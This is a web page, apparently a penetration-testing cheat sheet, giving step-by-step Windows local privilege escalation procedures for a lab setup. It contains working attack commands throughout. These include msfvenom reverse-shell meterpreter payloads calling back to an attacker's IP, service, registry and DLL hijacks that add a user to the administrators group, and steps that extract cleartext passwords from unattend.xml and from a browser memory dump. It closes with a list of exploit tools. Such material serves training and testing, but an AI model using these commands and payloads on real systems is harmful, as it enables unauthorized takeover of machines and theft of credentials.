<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="readloud">
    
    <link rel="shortcut icon" href="../../../img/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Localprivilegeescalation - readloud.org</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "LOCAL PRIVILEGE ESCALATION", url: "#_top", children: [
              {title: "Basic Privilege escalation", url: "#basic-privilege-escalation" },
          ]},
          {title: "1. Service Enumeration Get-ServiceUnquoted # returns services with unquoted paths that also have a space in the name Get-ModifiableServiceFile # returns services where the current user can write to the service binary path or its config Get-ModifiableService # returns services the current user can modify Get-ServiceDetail # returns detailed information about a specified service 2. Service Abuse Invoke-ServiceAbuse # modifies a vulnerable service to create a local admin or execute a custom command Write-ServiceBinary # writes out a patched C # service binary that adds a local admin or executes a custom command Install-ServiceBinary # replaces a service binary with one that adds a local admin or executes a custom command Restore-ServiceBinary # restores a replaced service binary with the original executable 3. DLL Hijacking Find-ProcessDLLHijack # finds potential DLL hijacking opportunities for currently running processes Find-PathDLLHijack # finds service %PATH% DLL hijacking opportunities Write-HijackDll # writes out a hijackable DLL 4. Registry Checks Get-RegistryAlwaysInstallElevated # checks if the AlwaysInstallElevated registry key is set Get-RegistryAutoLogon # checks for Autologon credentials in the registry Get-ModifiableRegistryAutoRun # checks for any modifiable binaries/scripts (or their configs) in HKLM autoruns 5. Miscellaneous Checks Get-ModifiableScheduledTaskFile # find schtasks with modifiable target files Get-UnattendedInstallFile # finds remaining unattended installation files Get-Webconfig # checks for any encrypted web.config strings Get-ApplicationHost # checks for encrypted application pool and virtual directory passwords Get-SiteListPassword # retrieves the plaintext passwords for any found McAfee`\u0026#39;s SiteList.xml files Get-CachedGPPPassword # checks for passwords in cached Group Policy Preferences files 6. Other Helpers/Meta-Functions Get-ModifiablePath # tokenizes an input string and returns the files in it the current user can modify Get-CurrentUserTokenGroupSid # returns all SIDs that the current user is a part of, whether they are disabled or not Add-ServiceDacl # adds a Dacl field to a service object returned by Get-Service Set-ServiceBinPath # sets the binary path for a service to a specified value through Win32 API methods Test-ServiceDaclPermission # tests one or more passed services or service names against a given permission set Write-UserAddMSI # write out a MSI installer that prompts for a user to be added 7. Check ALL Invoke-AllChecks # runs all current escalation checks and returns a report", url: "#1-service-enumeration-get-serviceunquoted-returns-services-with-unquoted-paths-that-also-have-a-space-in-the-name-get-modifiableservicefile-returns-services-where-the-current-user-can-write-to-the-service-binary-path-or-its-config-get-modifiableservice-returns-services-the-current-user-can-modify-get-servicedetail-returns-detailed-information-about-a-specified-service-2-service-abuse-invoke-serviceabuse-modifies-a-vulnerable-service-to-create-a-local-admin-or-execute-a-custom-command-write-servicebinary-writes-out-a-patched-c-service-binary-that-adds-a-local-admin-or-executes-a-custom-command-install-servicebinary-replaces-a-service-binary-with-one-that-adds-a-local-admin-or-executes-a-custom-command-restore-servicebinary-restores-a-replaced-service-binary-with-the-original-executable-3-dll-hijacking-find-processdllhijack-finds-potential-dll-hijacking-opportunities-for-currently-running-processes-find-pathdllhijack-finds-service-path-dll-hijacking-opportunities-write-hijackdll-writes-out-a-hijackable-dll-4-registry-checks-get-registryalwaysinstallelevated-checks-if-the-alwaysinstallelevated-registry-key-is-set-get-registryautologon-checks-for-autologon-credentials-in-the-registry-get-modifiableregistryautorun-checks-for-any-modifiable-binariesscripts-or-their-configs-in-hklm-autoruns-5-miscellaneous-checks-get-modifiablescheduledtaskfile-find-schtasks-with-modifiable-target-files-get-unattendedinstallfile-finds-remaining-unattended-installation-files-get-webconfig-checks-for-any-encrypted-webconfig-strings-get-applicationhost-checks-for-encrypted-application-pool-and-virtual-directory-passwords-get-sitelistpassword-retrieves-the-plaintext-passwords-for-any-found-mcafees-sitelistxml-files-get-cachedgpppassword-checks-for-passwords-in-cached-group-policy-preferences-files-6-other-helpersmeta-functions-get-modifiablepath-tokenizes-an-input-string-and-returns-the-files-in-it-the-current-user-can-modify-get-currentusertokengroupsid-returns-all-sids-that-the-current-user-is-a-part-of-whether-they-are-disabled-or-not-add-servicedacl-adds-a-dacl-field-to-a-service-object-returned-by-get-service-set-servicebinpath-sets-the-binary-path-for-a-service-to-a-specified-value-through-win32-api-methods-test-servicedaclpermission-tests-one-or-more-passed-services-or-service-names-against-a-given-permission-set-write-useraddmsi-write-out-a-msi-installer-that-prompts-for-a-user-to-be-added-7-check-all-invoke-allchecks-runs-all-current-escalation-checks-and-returns-a-report", children: [
          ]},
          {title: "Autorun", url: "#autorun", children: [
              {title: "Detection", url: "#detection" },
              {title: "Exploitation", url: "#exploitation" },
          ]},
          {title: "AlwaysInstallElevated", url: "#alwaysinstallelevated", children: [
              {title: "Detection", url: "#detection_1" },
              {title: "exploitation", url: "#exploitation_1" },
          ]},
          {title: "Registry", url: "#registry", children: [
              {title: "Detection", url: "#detection_2" },
              {title: "Exploitation", url: "#exploitation_2" },
          ]},
          {title: "Exec Path", url: "#exec-path", children: [
              {title: "Detection", url: "#detection_3" },
              {title: "Exploitation", url: "#exploitation_3" },
          ]},
          {title: "Startup Applications", url: "#startup-applications", children: [
              {title: "Detection", url: "#detection_4" },
              {title: "Exploitation", url: "#exploitation_4" },
          ]},
          {title: "DLL Hijacking", url: "#dll-hijacking", children: [
              {title: "Detection", url: "#detection_5" },
              {title: "Exploitation", url: "#exploitation_5" },
          ]},
          {title: "BinPath", url: "#binpath", children: [
              {title: "Detection", url: "#detection_6" },
              {title: "Exploitation", url: "#exploitation_6" },
          ]},
          {title: "Unquoted Service Paths", url: "#unquoted-service-paths", children: [
              {title: "Detection", url: "#detection_7" },
              {title: "Exploitation", url: "#exploitation_7" },
          ]},
          {title: "Hot Potato", url: "#hot-potato", children: [
              {title: "Exploitation", url: "#exploitation_8" },
          ]},
          {title: "Configuration Files", url: "#configuration-files", children: [
              {title: "Exploitation", url: "#exploitation_9" },
          ]},
          {title: "Memory", url: "#memory", children: [
              {title: "Exploitation", url: "#exploitation_10" },
          ]},
          {title: "Stuff", url: "#stuff", children: [
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    

    <h2 id="local-privilege-escalation">LOCAL PRIVILEGE ESCALATION</h2>
<h3 id="basic-privilege-escalation">Basic Privilege escalation</h3>
<h2 id="1-service-enumeration-get-serviceunquoted-returns-services-with-unquoted-paths-that-also-have-a-space-in-the-name-get-modifiableservicefile-returns-services-where-the-current-user-can-write-to-the-service-binary-path-or-its-config-get-modifiableservice-returns-services-the-current-user-can-modify-get-servicedetail-returns-detailed-information-about-a-specified-service-2-service-abuse-invoke-serviceabuse-modifies-a-vulnerable-service-to-create-a-local-admin-or-execute-a-custom-command-write-servicebinary-writes-out-a-patched-c-service-binary-that-adds-a-local-admin-or-executes-a-custom-command-install-servicebinary-replaces-a-service-binary-with-one-that-adds-a-local-admin-or-executes-a-custom-command-restore-servicebinary-restores-a-replaced-service-binary-with-the-original-executable-3-dll-hijacking-find-processdllhijack-finds-potential-dll-hijacking-opportunities-for-currently-running-processes-find-pathdllhijack-finds-service-path-dll-hijacking-opportunities-write-hijackdll-writes-out-a-hijackable-dll-4-registry-checks-get-registryalwaysinstallelevated-checks-if-the-alwaysinstallelevated-registry-key-is-set-get-registryautologon-checks-for-autologon-credentials-in-the-registry-get-modifiableregistryautorun-checks-for-any-modifiable-binariesscripts-or-their-configs-in-hklm-autoruns-5-miscellaneous-checks-get-modifiablescheduledtaskfile-find-schtasks-with-modifiable-target-files-get-unattendedinstallfile-finds-remaining-unattended-installation-files-get-webconfig-checks-for-any-encrypted-webconfig-strings-get-applicationhost-checks-for-encrypted-application-pool-and-virtual-directory-passwords-get-sitelistpassword-retrieves-the-plaintext-passwords-for-any-found-mcafees-sitelistxml-files-get-cachedgpppassword-checks-for-passwords-in-cached-group-policy-preferences-files-6-other-helpersmeta-functions-get-modifiablepath-tokenizes-an-input-string-and-returns-the-files-in-it-the-current-user-can-modify-get-currentusertokengroupsid-returns-all-sids-that-the-current-user-is-a-part-of-whether-they-are-disabled-or-not-add-servicedacl-adds-a-dacl-field-to-a-service-object-returned-by-get-service-set-servicebinpath-sets-the-binary-path-for-a-service-to-a-specified-value-through-win32-api-methods-test-servicedaclpermission-tests-one-or-more-passed-services-or-service-names-against-a-given-permission-set-write-useraddmsi-write-out-a-msi-installer-that-prompts-for-a-user-to-be-added-7-check-all-invoke-allchecks-runs-all-current-escalation-checks-and-returns-a-report"><div class="language-powershell highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="n">1</span><span class="p">.</span> <span class="n">Service</span> <span class="n">Enumeration</span>
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="nb">Get-ServiceUnquoted</span>                 <span class="c">#   returns services with unquoted paths that also have a space in the name</span>
</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="nb">Get-ModifiableServiceFile</span>           <span class="c">#   returns services where the current user can write to the service binary path or its config</span>
</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="nb">Get-ModifiableService</span>               <span class="c">#   returns services the current user can modify</span>
</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="nb">Get-ServiceDetail</span>                   <span class="c">#   returns detailed information about a specified service</span>
</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>
</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="n">2</span><span class="p">.</span> <span class="n">Service</span> <span class="n">Abuse</span>
</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="nb">Invoke-ServiceAbuse</span>                 <span class="c">#   modifies a vulnerable service to create a local admin or execute a custom command</span>
</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a><span class="nb">Write-ServiceBinary</span>                 <span class="c">#   writes out a patched C # service binary that adds a local admin or executes a custom command</span>
</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a><span class="nb">Install-ServiceBinary</span>               <span class="c">#   replaces a service binary with one that adds a local admin or executes a custom command</span>
</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a><span class="nb">Restore-ServiceBinary</span>               <span class="c">#   restores a replaced service binary with the original executable</span>
</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>
</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a><span class="n">3</span><span class="p">.</span> <span class="n">DLL</span> <span class="n">Hijacking</span>
</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a><span class="nb">Find-ProcessDLLHijack</span>               <span class="c">#   finds potential DLL hijacking opportunities for currently running processes</span>
</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a><span class="nb">Find-PathDLLHijack</span>                  <span class="c">#   finds service %PATH% DLL hijacking opportunities</span>
</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a><span class="nb">Write-HijackDll</span>                     <span class="c">#   writes out a hijackable DLL</span>
</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a>
</span><span id="__span-0-18"><a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a><span class="n">4</span><span class="p">.</span> <span class="n">Registry</span> <span class="n">Checks</span>
</span><span id="__span-0-19"><a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a><span class="nb">Get-RegistryAlwaysInstallElevated</span>   <span class="c">#  checks if the AlwaysInstallElevated registry key is set</span>
</span><span id="__span-0-20"><a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a><span class="nb">Get-RegistryAutoLogon</span>               <span class="c">#   checks for Autologon credentials in the registry</span>
</span><span id="__span-0-21"><a id="__codelineno-0-21" name="__codelineno-0-21" href="#__codelineno-0-21"></a><span class="nb">Get-ModifiableRegistryAutoRun</span>       <span class="c">#   checks for any modifiable binaries/scripts (or their configs) in HKLM autoruns</span>
</span><span id="__span-0-22"><a id="__codelineno-0-22" name="__codelineno-0-22" href="#__codelineno-0-22"></a>
</span><span id="__span-0-23"><a id="__codelineno-0-23" name="__codelineno-0-23" href="#__codelineno-0-23"></a><span class="n">5</span><span class="p">.</span> <span class="n">Miscellaneous</span> <span class="n">Checks</span>
</span><span id="__span-0-24"><a id="__codelineno-0-24" name="__codelineno-0-24" href="#__codelineno-0-24"></a><span class="nb">Get-ModifiableScheduledTaskFile</span>     <span class="c">#   find schtasks with modifiable target files</span>
</span><span id="__span-0-25"><a id="__codelineno-0-25" name="__codelineno-0-25" href="#__codelineno-0-25"></a><span class="nb">Get-UnattendedInstallFile</span>           <span class="c">#   finds remaining unattended installation files</span>
</span><span id="__span-0-26"><a id="__codelineno-0-26" name="__codelineno-0-26" href="#__codelineno-0-26"></a><span class="nb">Get-Webconfig</span>                       <span class="c">#   checks for any encrypted web.config strings</span>
</span><span id="__span-0-27"><a id="__codelineno-0-27" name="__codelineno-0-27" href="#__codelineno-0-27"></a><span class="nb">Get-ApplicationHost</span>                 <span class="c">#   checks for encrypted application pool and virtual directory passwords</span>
</span><span id="__span-0-28"><a id="__codelineno-0-28" name="__codelineno-0-28" href="#__codelineno-0-28"></a><span class="nb">Get-SiteListPassword</span>                <span class="c">#   retrieves the plaintext passwords for any found McAfee`&#39;s SiteList.xml files</span>
</span><span id="__span-0-29"><a id="__codelineno-0-29" name="__codelineno-0-29" href="#__codelineno-0-29"></a><span class="nb">Get-CachedGPPPassword</span>               <span class="c">#   checks for passwords in cached Group Policy Preferences files</span>
</span><span id="__span-0-30"><a id="__codelineno-0-30" name="__codelineno-0-30" href="#__codelineno-0-30"></a>
</span><span id="__span-0-31"><a id="__codelineno-0-31" name="__codelineno-0-31" href="#__codelineno-0-31"></a><span class="n">6</span><span class="p">.</span> <span class="n">Other</span> <span class="n">Helpers</span><span class="p">/</span><span class="n">Meta-Functions</span>
</span><span id="__span-0-32"><a id="__codelineno-0-32" name="__codelineno-0-32" href="#__codelineno-0-32"></a><span class="nb">Get-ModifiablePath</span>                  <span class="c">#   tokenizes an input string and returns the files in it the current user can modify</span>
</span><span id="__span-0-33"><a id="__codelineno-0-33" name="__codelineno-0-33" href="#__codelineno-0-33"></a><span class="nb">Get-CurrentUserTokenGroupSid</span>        <span class="c">#   returns all SIDs that the current user is a part of, whether they are disabled or not</span>
</span><span id="__span-0-34"><a id="__codelineno-0-34" name="__codelineno-0-34" href="#__codelineno-0-34"></a><span class="nb">Add-ServiceDacl</span>                     <span class="c">#   adds a Dacl field to a service object returned by Get-Service</span>
</span><span id="__span-0-35"><a id="__codelineno-0-35" name="__codelineno-0-35" href="#__codelineno-0-35"></a><span class="nb">Set-ServiceBinPath</span>                  <span class="c">#   sets the binary path for a service to a specified value through Win32 API methods</span>
</span><span id="__span-0-36"><a id="__codelineno-0-36" name="__codelineno-0-36" href="#__codelineno-0-36"></a><span class="nb">Test-ServiceDaclPermission</span>          <span class="c">#   tests one or more passed services or service names against a given permission set</span>
</span><span id="__span-0-37"><a id="__codelineno-0-37" name="__codelineno-0-37" href="#__codelineno-0-37"></a><span class="nb">Write-UserAddMSI</span>                    <span class="c">#   write out a MSI installer that prompts for a user to be added</span>
</span><span id="__span-0-38"><a id="__codelineno-0-38" name="__codelineno-0-38" href="#__codelineno-0-38"></a>
</span><span id="__span-0-39"><a id="__codelineno-0-39" name="__codelineno-0-39" href="#__codelineno-0-39"></a><span class="n">7</span><span class="p">.</span> <span class="n">Check</span> <span class="n">ALL</span>
</span><span id="__span-0-40"><a id="__codelineno-0-40" name="__codelineno-0-40" href="#__codelineno-0-40"></a><span class="nb">Invoke-AllChecks</span>                    <span class="c">#   runs all current escalation checks and returns a report</span>
</span></code></pre></div></h2>
<h2 id="autorun">Autorun</h2>
<h3 id="detection">Detection</h3>
<p>Windows VM
1. Open command prompt and type: C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe
2. In Autoruns, click on the ‚ÄòLogon‚Äô tab.
3. From the listed results, notice that the ‚ÄúMy Program‚Äù entry is pointing to ‚ÄúC:\Program Files\Autorun Program\program.exe‚Äù.
4. In command prompt type: C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"
5. From the output, notice that the ‚ÄúEveryone‚Äù user group has ‚ÄúFILE_ALL_ACCESS‚Äù permission on the ‚Äúprogram.exe‚Äù file.</p>
<h3 id="exploitation">Exploitation</h3>
<p>Kali VM
1. Open command prompt and type: msfconsole
2. In Metasploit (msf &gt; prompt) type: use multi/handler
3. In Metasploit (msf &gt; prompt) type: set payload windows/meterpreter/reverse_tcp
4. In Metasploit (msf &gt; prompt) type: set lhost [Kali VM IP Address]
5. In Metasploit (msf &gt; prompt) type: run
6. Open an additional command prompt and type: msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f exe -o program.exe
7. Copy the generated file, program.exe, to the Windows VM.</p>
<p>Windows VM
1. Place program.exe in ‚ÄòC:\Program Files\Autorun Program‚Äô.
2. To simulate the privilege escalation effect, logoff and then log back on as an administrator user.</p>
<p>Kali VM
1. Wait for a new session to open in Metasploit.
2. In Metasploit (msf &gt; prompt) type: sessions -i [Session ID]
3. To confirm that the attack succeeded, in Metasploit (msf &gt; prompt) type: getuid</p>
<hr />
<h2 id="alwaysinstallelevated">AlwaysInstallElevated</h2>
<h3 id="detection_1">Detection</h3>
<p>Windows VM
1. Open command prompt and type: reg query HKLM\Software\Policies\Microsoft\Windows\Installer
2. From the output, notice that ‚ÄúAlwaysInstallElevated‚Äù value is 1
3. In command prompt type: reg query HKCU\Software\Policies\Microsoft\Windows\Installer
4. From the output, notice that ‚ÄúAlwaysInstallElevated‚Äù value is 1</p>
<h3 id="exploitation_1">exploitation</h3>
<p>Kali VM
1. Open command prompt and type: msfconsole
2. In Metasploit (msf &gt; prompt) type: use multi/handler
3. In Metasploit (msf &gt; prompt) type: set payload windows/meterpreter/reverse_tcp
4. In Metasploit (msf &gt; prompt) type: set lhost [Kali VM IP Address]
5. In Metasploit (msf &gt; prompt) type: run
6. Open an additional command prompt and type: msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f msi -o setup.msi
7. Copy the generated file, setup.msi, to the Windows VM.</p>
<p>Windows VM
1. Place ‚Äòsetup.msi‚Äô in ‚ÄòC:\Temp‚Äô.
2. Open command prompt and type: msiexec /quiet /qn /i C:\Temp\setup.msi
3. It  is possible to confirm that the user was added to the local  administrators group by typing the following in the command prompt: net localgroup administrators</p>
<hr />
<h2 id="registry">Registry</h2>
<h3 id="detection_2">Detection</h3>
<p>Windows VM
1. Open powershell prompt and type: Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
2. Notice that the output suggests that user belong to ‚ÄúNT  AUTHORITY\INTERACTIVE‚Äù has ‚ÄúFullContol‚Äù permission over the registry  key.</p>
<h3 id="exploitation_2">Exploitation</h3>
<p>Windows VM
1. Copy ‚ÄòC:\Users\User\Desktop\Tools\Source\windows_service.c‚Äô to the Kali VM.</p>
<p>Kali VM
1. Open windows_service.c in a text editor and replace the command used by the system() function to: cmd.exe /k net localgroup administrators user /add
2. Exit the text editor and compile the file by typing the following in the command prompt: x86_64-w64-mingw32-gcc windows_service.c -o x.exe (NOTE: if this is not installed, use 'sudo apt install gcc-mingw-w64') 
3. Copy the generated file x.exe, to the Windows VM.</p>
<p>Windows VM
1. Place x.exe in ‚ÄòC:\Temp‚Äô.
2. Open command prompt at type: reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
3. In the command prompt type: sc start regsvc
4.  It is possible to confirm that the user was added to the local  administrators group by typing the following in the command prompt: net localgroup administrators</p>
<hr />
<h2 id="exec-path">Exec Path</h2>
<h3 id="detection_3">Detection</h3>
<p>Windows VM
1. Open command prompt and type: C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"
2. Notice that the ‚ÄúEveryone‚Äù user group has ‚ÄúFILE_ALL_ACCESS‚Äù permission on the filepermservice.exe file.</p>
<h3 id="exploitation_3">Exploitation</h3>
<p>Windows VM
1. Open command prompt and type: copy /y c:\Temp\x.exe "c:\Program Files\File Permissions Service\filepermservice.exe"
2. In command prompt type: sc start filepermsvc
3.  It is possible to confirm that the user was added to the local  administrators group by typing the following in the command prompt: net localgroup administrators</p>
<hr />
<h2 id="startup-applications">Startup Applications</h2>
<h3 id="detection_4">Detection</h3>
<p>Windows VM
1. Open command prompt and type: icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
2. From the output notice that the ‚ÄúBUILTIN\Users‚Äù group has full access ‚Äò(F)‚Äô to the directory.</p>
<h3 id="exploitation_4">Exploitation</h3>
<p>Kali VM
1. Open command prompt and type: msfconsole
2. In Metasploit (msf &gt; prompt) type: use multi/handler
3. In Metasploit (msf &gt; prompt) type: set payload windows/meterpreter/reverse_tcp
4. In Metasploit (msf &gt; prompt) type: set lhost [Kali VM IP Address]
5. In Metasploit (msf &gt; prompt) type: run
6. Open another command prompt and type: msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Kali VM IP Address] -f exe -o x.exe
7. Copy the generated file, x.exe, to the Windows VM.
Windows VM
1. Place x.exe in ‚ÄúC:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup‚Äù.
2. Logoff.
3. Login with the administrator account credentials.
Kali VM
1. Wait for a session to be created, it may take a few seconds.
2. In Meterpreter(meterpreter &gt; prompt) type: getuid
3. From the output, notice the user is ‚ÄúUser-PC\Admin‚Äù</p>
<hr />
<h2 id="dll-hijacking">DLL Hijacking</h2>
<h3 id="detection_5">Detection</h3>
<p>Windows VM
1. Open the Tools folder that is located on the desktop and then go the Process Monitor folder.
2. In reality, executables would be copied from the victim‚Äôs host over to  the attacker‚Äôs host for analysis during run time. Alternatively, the  same software can be installed on the attacker‚Äôs host for analysis, in  case they can obtain it. To simulate this, right click on Procmon.exe  and select ‚ÄòRun as administrator‚Äô from the menu.
3. In procmon, select "filter".  From the left-most drop down menu, select ‚ÄòProcess Name‚Äô.
4. In the input box on the same line type: dllhijackservice.exe
5. Make sure the line reads ‚ÄúProcess Name is dllhijackservice.exe then  Include‚Äù and click on the ‚ÄòAdd‚Äô button, then ‚ÄòApply‚Äô and lastly on ‚ÄòOK‚Äô.
6. Next, select from the left-most drop down menu ‚ÄòResult‚Äô.
7. In the input box on the same line type: NAME NOT FOUND
8. Make sure the line reads ‚ÄúResult is NAME NOT FOUND then Include‚Äù and click on the ‚ÄòAdd‚Äô button, then ‚ÄòApply‚Äô and lastly on ‚ÄòOK‚Äô.
9. Open command prompt and type: sc start dllsvc
10. Scroll to the bottom of the window. One of the highlighted results  shows that the service tried to execute ‚ÄòC:\Temp\hijackme.dll‚Äô yet it  could not do that as the file was not found. Note that ‚ÄòC:\Temp‚Äô is a  writable location.</p>
<h3 id="exploitation_5">Exploitation</h3>
<p>Windows VM
1. Copy ‚ÄòC:\Users\User\Desktop\Tools\Source\windows_dll.c‚Äô to the Kali VM.</p>
<p>Kali VM
1. Open windows_dll.c in a text editor and replace the command used by the system() function to: cmd.exe /k net localgroup administrators user /add
2. Exit the text editor and compile the file by typing the following in the command prompt: x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll
3. Copy the generated file hijackme.dll, to the Windows VM.
Windows VM
1. Place hijackme.dll in ‚ÄòC:\Temp‚Äô.
2. Open command prompt and type: sc stop dllsvc &amp; sc start dllsvc
3.  It is possible to confirm that the user was added to the local  administrators group by typing the following in the command prompt: net localgroup administrators</p>
<hr />
<h2 id="binpath">BinPath</h2>
<h3 id="detection_6">Detection</h3>
<p>Windows VM
1. Open command prompt and type: C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc daclsvc
2. Notice that the output suggests that the user ‚ÄúUser-PC\User‚Äù has the ‚ÄúSERVICE_CHANGE_CONFIG‚Äù permission.</p>
<h3 id="exploitation_6">Exploitation</h3>
<p>Windows VM
1. In command prompt type: sc config daclsvc binpath= "net localgroup administrators user /add"
2. In command prompt type: sc start daclsvc
3. It is possible to confirm that the user was added to the local  administrators group by typing the following in the command prompt: net localgroup administrators</p>
<hr />
<h2 id="unquoted-service-paths">Unquoted Service Paths</h2>
<h3 id="detection_7">Detection</h3>
<p>Windows VM
1. Open command prompt and type: sc qc unquotedsvc
2. Notice that the ‚ÄúBINARY_PATH_NAME‚Äù field displays a path that is not confined between quotes.</p>
<h3 id="exploitation_7">Exploitation</h3>
<p>Kali VM
1. Open command prompt and type: msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe
2. Copy the generated file, common.exe, to the Windows VM.</p>
<p>Windows VM
1. Place common.exe in ‚ÄòC:\Program Files\Unquoted Path Service‚Äô.
2. Open command prompt and type: sc start unquotedsvc
3.  It is possible to confirm that the user was added to the local  administrators group by typing the following in the command prompt: net localgroup administrators</p>
<hr />
<h2 id="hot-potato">Hot Potato</h2>
<h3 id="exploitation_8">Exploitation</h3>
<p>Windows VM
1. In command prompt type: powershell.exe -nop -ep bypass
2. In Power Shell prompt type: Import-Module C:\Users\User\Desktop\Tools\Tater\Tater.ps1
3. In Power Shell prompt type: Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"
4. To confirm that the attack was successful, in Power Shell prompt type: net localgroup administrators</p>
<hr />
<h2 id="configuration-files">Configuration Files</h2>
<h3 id="exploitation_9">Exploitation</h3>
<p>Windows VM
1. Open command prompt and type: notepad C:\Windows\Panther\Unattend.xml
2.  Scroll down to the "Password" property and copy the base64 string that is confined between the "Value" tags underneath it.</p>
<p>Kali VM
1. In a terminal, type: echo [copied base64] | base64 -d
2. Notice the cleartext password</p>
<hr />
<h2 id="memory">Memory</h2>
<h3 id="exploitation_10">Exploitation</h3>
<p>Kali VM
1. Open command prompt and type: msfconsole
2. In Metasploit (msf &gt; prompt) type: use auxiliary/server/capture/http_basic
3. In Metasploit (msf &gt; prompt) type: set uripath x
4. In Metasploit (msf &gt; prompt) type: run</p>
<p>Windows VM
1. Open Internet Explorer and browse to: http://[Kali VM IP Address]/x
2. Open command prompt and type: taskmgr
3. In  Windows Task Manager, right-click on the ‚Äúiexplore.exe‚Äù in the "Image  Name" columnand select ‚ÄúCreate Dump File‚Äù from the popup menu.
4. Copy the generated file, iexplore.DMP, to the Kali VM.</p>
<p>Kali VM
1. Place 'iexplore.DMP' on the desktop.
2. Open command prompt and type: strings /root/Desktop/iexplore.DMP | grep "Authorization: Basic"
3. Select the Copy the Base64 encoded string.
4. In command prompt type: echo -ne [Base64 String] | base64 -d
5. Notice the credentials in the output.</p>
<hr />
<h2 id="stuff">Stuff</h2>
<ul>
<li>PowerUp Misconfiguration Abuse</li>
<li>Powerless (bat version OSCP prepair)</li>
<li>BeRoot General Priv Esc Enumeration Tool</li>
<li>Privesc General Priv Esc Enumeration Tool</li>
<li>FullPowers Restore A Service Account's Privileges</li>
<li>Juicy Potato Abuse SeImpersonate or SeAssignPrimaryToken Privileges for System Impersonation, warning Works only until Windows Server 2016 and Windows 10 until patch 1803</li>
<li>Lovely Potato Automated Juicy Potato, warning Works only until Windows Server 2016 and Windows 10 until patch 1803</li>
<li>PrintSpoofer Exploit the PrinterBug for System Impersonation</li>
<li>Pray Works for Windows Server 2019 and Windows 10</li>
<li>RoguePotato Upgraded Juicy Potato</li>
<li>Pray Works for Windows Server 2019 and Windows 10</li>
<li>Abusing Token Privileges</li>
<li>SMBGhost CVE-2020-0796</li>
</ul>
<hr />

  <br>
    

    <br>
</div>

<footer class="col-md-12 wm-page-content">
      <p>
        <a href="https://github.com/readloud/readloud.github.io/releases/tag/themes/edit/master/docs/explore/resource/localprivilegeescalation.md"><i class="fa fa-github"></i>
Edit on GitHub</a>
      </p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/noraj/mkdocs-windmill-dark">Windmill Dark</a> theme by Alexandre ZANNI (noraj).</p>
